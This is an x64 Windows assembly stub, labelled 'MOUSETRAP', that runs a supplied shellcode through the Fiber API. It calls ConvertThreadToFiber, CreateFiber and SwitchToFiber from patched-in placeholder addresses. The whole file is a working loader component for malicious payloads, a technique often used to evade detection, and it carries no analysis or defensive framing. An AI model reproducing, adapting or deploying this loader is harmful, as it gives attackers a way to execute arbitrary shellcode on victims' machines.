; MOUSETRAP Stub - Patched Address
; Purpose: Execute shellcode via Fibers using locally resolved addresses
; Arch: Windows x64
;
[bits 64]

section .text:
    global _start

_start:
    ; Data passed:
    ; RDI = Shellcode Address (passed via context)

    ; Stack Alignment
    and rsp, -16

    ; ConvertThreadToFiber(NULL)
    ; load address from placeholder
    mov rax, 0x1111111111111111
    
    xor rcx, rcx
    sub rsp, 32
    call rax
    add rsp, 32
    
    ; CreateFiber(0, shellcode, NULL)
    ; load address from placeholder
    mov rax, 0x2222222222222222
    
    xor rcx, rcx
    mov rdx, rdi
    xor r8, r8
    sub rsp, 32
    call rax                    ; call CreateFiber
    add rsp, 32

    mov r15, rax

    ; SwitchToFiber(fiber)
    ; load address from placeholder
    mov rax, 0x3333333333333333

    mov rcx, r15
    sub rsp, 32
    call rax
    
    ; should not reach
    int 3